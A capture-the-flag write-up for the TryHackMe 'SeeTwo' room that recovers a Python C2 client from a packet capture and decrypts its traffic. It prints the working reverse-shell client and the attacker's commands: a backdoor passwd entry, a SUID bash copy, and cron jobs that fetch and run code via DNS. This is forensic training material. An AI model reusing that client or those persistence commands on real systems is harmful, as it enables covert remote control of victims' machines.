---
title: "TryHackMe: SeeTwo"
author: jaxafed
categories: [TryHackMe]
tags: [pcap, wireshark, http, tcp, c2, python, xor, base64]
render_with_liquid: false
media_subpath: /images/tryhackme_seetwo/
image:
  path: room_image.webp
---

**SeeTwo** was a room about extracting a basic **C2** client from a packet capture file and reverse engineering it to understand its functionality. Using the same packet capture file, we then extracted the **C2** traffic. By understanding how the client operates, we were able to decrypt the traffic to reveal all executed commands and their outputs, allowing us to answer all the questions in the room.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/r/room/seetworoom){: .center }

## Examining the Packet Capture

At the start of the room, we are provided with a zip archive containing a single packet capture file: `capture.pcap`.

```console
$ zipinfo evidence-1698376680956.zip
Archive:  evidence-1698376680956.zip
Zip file size: 12372032 bytes, number of entries: 1
-rw-------  3.0 unx 16493208 bx defN 23-Oct-27 03:08 capture.pcap
1 file, 16493208 bytes uncompressed, 12371858 bytes compressed:  25.0%
```

We proceed by extracting the archive and opening `capture.pcap` in `Wireshark`.

```console
$ unzip evidence-1698376680956.zip
Archive:  evidence-1698376680956.zip
  inflating: capture.pcap

$ wireshark capture.pcap
```

By checking **Statistics -> Conversations**, we mainly observe three conversations: SSH traffic on port **22**, unknown traffic on port **1337**, and HTTP traffic on port **80**.

![Wireshark Statistics](wireshark_statistics.webp){: width="1200" height="400" }

Starting with the HTTP traffic, we see a single request for the `base64_client` file, and the response contains base64-encoded data.

![Wireshark Http Request](wireshark_http_request.webp){: width="900" height="600" }

We can use **File -> Export Objects -> HTTP** to extract this file.

![Wireshark Extract Data](wireshark_extract_data.webp){: width="750" height="600" }

## Reverse Engineering the base64_client

Since we know the file is **base64** encoded, we begin by decoding it.

```console
$ base64 -d base64_client > client
```

After decoding the file, we observe that it is an **ELF** file.

```console
$ file client
client: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=7714ff204a0a7dcd042276bab94a99bad4d276f0, for GNU/Linux 2.6.32, stripped
```
{: .wrap }

Examining the strings in the binary, we find multiple references to **Python** and **PyInstaller**.

```console
$ strings client
...
Error loading Python lib '%s': dlopen: %s
...
Cannot open PyInstaller archive from executable (%s) or external archive (%s)
...
PYINSTALLER_STRICT_UNPACK_MODE
...
```

It appears the **ELF** file is packed using **PyInstaller**. We can use [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) to extract it.

```console
$ git clone https://github.com/extremecoders-re/pyinstxtractor

$ python3 pyinstxtractor/pyinstxtractor.py client
[+] Processing client
[+] Pyinstaller version: 2.1+
[+] Python version: 3.8
[+] Length of package: 11922732 bytes
[+] Found 47 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: client.pyc
[!] Warning: This script is running in a different Python version than the one used to build the executable.
[!] Please run this script in Python 3.8 to prevent extraction errors during unmarshalling
[!] Skipping pyz extraction
[+] Successfully extracted pyinstaller archive: client

You can now use a python decompiler on the pyc files within the extracted directory
```

`pyinstxtractor` indicates that `client.pyc` may serve as the entry point, but it is currently compiled **Python** code. We can use [uncompyle6](https://github.com/rocky/python-uncompyle6) to decompile it.

```console
$ uncompyle6 client_extracted/client.pyc > client.py
```

Upon reviewing the `client.py` script, we find that it is fairly basic.

```py
import socket, base64, subprocess, sys
HOST = "10.0.2.64"
PORT = 1337

def xor_crypt(data, key):
    key_length = len(key)
    encrypted_data = []
    for i, byte in enumerate(data):
        encrypted_byte = byte ^ key[i % key_length]
        encrypted_data.append(encrypted_byte)
    else:
        return bytes(encrypted_data)


with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    while True:
        received_data = s.recv(4096).decode("utf-8")
        encoded_image, encoded_command = received_data.split("AAAAAAAAAA")
        key = "MySup3rXoRKeYForCommandandControl".encode("utf-8")
        decrypted_command = xor_crypt(base64.b64decode(encoded_command.encode("utf-8")), key)
        decrypted_command = decrypted_command.decode("utf-8")
        result = subprocess.check_output(decrypted_command, shell=True).decode("utf-8")
        encrypted_result = xor_crypt(result.encode("utf-8"), key)
        encrypted_result_base64 = base64.b64encode(encrypted_result).decode("utf-8")
        separator = "AAAAAAAAAA"
        send = encoded_image + separator + encrypted_result_base64
        s.sendall(send.encode("utf-8"))
```
{: file="client.py" }

First, it starts a socket and binds it to `10.0.2.64:1337`.

```py
HOST = "10.0.2.64"
PORT = 1337

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
```

After that, it enters a loop and waits to receive data. When it receives data, it saves it in the `received_data` variable.

```py
while True:
    received_data = s.recv(4096).decode("utf-8")
```

Next, it splits the received data at `AAAAAAAAAA`, saving the first part as `encoded_image` and the second part as `encoded_command`.

```py
encoded_image, encoded_command = received_data.split("AAAAAAAAAA")
```

Then, it **base64** decodes the `encoded_command`, XOR decrypts it with the key `MySup3rXoRKeYForCommandandControl`, and saves it in the `decrypted_command` variable.

```py
key = "MySup3rXoRKeYForCommandandControl".encode("utf-8")
decrypted_command = xor_crypt(base64.b64decode(encoded_command.encode("utf-8")), key)
decrypted_command = decrypted_command.decode("utf-8")
```

After that, it runs the `decrypted_command` using `subprocess.check_output` and saves the output of the command in the `result` variable.

```py
result = subprocess.check_output(decrypted_command, shell=True).decode("utf-8")
```

Finally, using the same key, it **XOR** encrypts the `result`, **base64** encodes it, and sends it back along with the `encoded_image`, using `AAAAAAAAAA` as the separator in between. Essentially, it performs the same operations used to decrypt the received data in reverse.

```py
encrypted_result = xor_crypt(result.encode("utf-8"), key)
encrypted_result_base64 = base64.b64encode(encrypted_result).decode("utf-8")
separator = "AAAAAAAAAA"
send = encoded_image + separator + encrypted_result_base64
s.sendall(send.encode("utf-8"))
```

## Decrypting the Commands and Outputs

Knowing how the client operates, we can assume that the traffic observed in the packet capture file for `10.0.2.64:1337` is generated by the client.

The client is clearly used to run commands from an attacker, and all the questions in the room relate to the executed commands. Therefore, it seems necessary to decrypt the traffic to answer them.

First, we can use `tshark` to extract all traffic going to or coming from `10.0.2.64:1337` from the packet capture file. We also need to hex decode the output using `xxd`, as `tshark` outputs data in hex-encoded format. We perform this in a while loop, decoding it line by line to ensure both the encrypted commands and their outputs are on separate lines in the output. Additionally, we use `grep` to skip the empty lines.

```console
$ tshark -r capture.pcap -Y "tcp.port == 1337 && ip.addr == 10.0.2.64" -T fields -e tcp.payload | while read -r line; do echo "$line" | xxd -r -p | grep . ; done > output.txt
```
{: .wrap }

Now that we have all the traffic from the client and know that both the commands and their outputs are encrypted in the same way, we can write a simple script to decrypt both and print them.

```py
import base64
from pwn import xor

for line in open("./output.txt", "r").readlines():
	command_or_output_b64 = line.split("AAAAAAAAAA")[1]
	command_or_output = base64.b64decode(command_or_output_b64)
	print(xor(command_or_output, b"MySup3rXoRKeYForCommandandControl")[:len(command_or_output)].decode())
```
{: file="dec.py" }

Running the script, we obtain all the commands executed by the attacker along with their outputs.

```console
$ python3 dec.py
id
uid=1000(bella) gid=1000(bella) groups=1000(bella),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)

cat /h[REDACTED]ry
my[REDACTED]i'

sudo -l
Matching Defaults entries for bella on seetwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bella may run the following commands on seetwo:
    (ALL : ALL) ALL

id
uid=0(root) gid=0(root) groups=0(root)

echo 'to[REDACTED]sh' >> /etc/passwd

tail -n 1 /etc/passwd
to[REDACTED]sh

cp /usr/bin/bash /u[REDACTED]wd

chmod u+s /u[REDACTED]wd

ls -l /u[REDACTED]wd
-rwsr-xr-x 1 root root 1183448 Oct 27 03:07 /u[REDACTED]wd

md5sum /u[REDACTED]wd
23[REDACTED]ec  /us[REDACTED]wd

md5sum /usr/bin/bash
23[REDACTED]ec  /usr/bin/bash

echo '* * * * * /bin/sh -c "[REDACTED]"' >> /var/spool/cron/crontabs/root

tail -n 1 /var/spool/cron/crontabs/root
* * * * * /bin/sh -c "[REDACTED]"

echo '* * * * * echo L2[REDACTED]ki | base64 | sh' >> /var/spool/cron/crontabs/bella

tail -n 1 /var/spool/cron/crontabs/bella
* * * * * echo L2[REDACTED]ki | base64 | sh
```

## Answering the Questions

1. What is the first file that is read? Enter the full path of the file.

	```console
	cat /h[REDACTED]ry
	my[REDACTED]i'
	```

	The answer is the file passed to the `cat` command: `/h[REDACTED]ry`.

2. What is the output of the file from question 1?

	```console
	cat /h[REDACTED]ry
	my[REDACTED]i'
	```

	The answer is the output of the `cat` command: `my[REDACTED]i'`.

3. What is the user that the attacker created as a backdoor? Enter the entire line that indicates the user.

	We can see the attacker creating a user manually by writing to the `/etc/passwd` file.

	```console
	echo 'to[REDACTED]sh' >> /etc/passwd

	tail -n 1 /etc/passwd
	to[REDACTED]sh
	```

	The answer is `to[REDACTED]sh`.

4. What is the name of the backdoor executable?

	We can see that the attacker is copying the `bash` executable and setting the `suid` bit for the copied binary.

	```console
	cp /usr/bin/bash /u[REDACTED]wd

	chmod u+s /u[REDACTED]wd
	```

	The answer is `/u[REDACTED]wd`.

5. What is the md5 hash value of the executable from question 4?

	After setting the `suid` bit, we can see the attacker using `md5sum` to check the hashes for the binaries.

	```console
	md5sum /u[REDACTED]wd
	23[REDACTED]ec  /us[REDACTED]wd

	md5sum /usr/bin/bash
	23[REDACTED]ec  /usr/bin/bash
	```

	The answer is `23[REDACTED]ec`.

6. What was the first cronjob that was placed by the attacker?

	We can see the attacker creating a cronjob by making an entry in `/var/spool/cron/crontabs/root`.

	```console
	echo '* * * * * /bin/sh -c "[REDACTED]"' >> /var/spool/cron/crontabs/root

	tail -n 1 /var/spool/cron/crontabs/root
	* * * * * /bin/sh -c "[REDACTED]"
	```

	The answer is `* * * * * /bin/sh -c "[REDACTED]"`.

7. What is the flag?

	Lastly, we can see another cronjob created by the attacker.

	```console
	echo '* * * * * echo L2[REDACTED]ki | base64 | sh' >> /var/spool/cron/crontabs/bella

	tail -n 1 /var/spool/cron/crontabs/bella
	* * * * * echo L2[REDACTED]ki | base64 | sh
	```

	Decoding the **base64** encoded string in the cronjob, we get our flag.

	```console
	$ echo L2[REDACTED]ki | base64 -d
	/bin/sh -c "sh -c $(dig ev1l.thm TXT +short @ns.THM{[REDACTED]}.thm)"
	```

	The answer is `THM{[REDACTED]}`.

<style>
.center img {        
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>

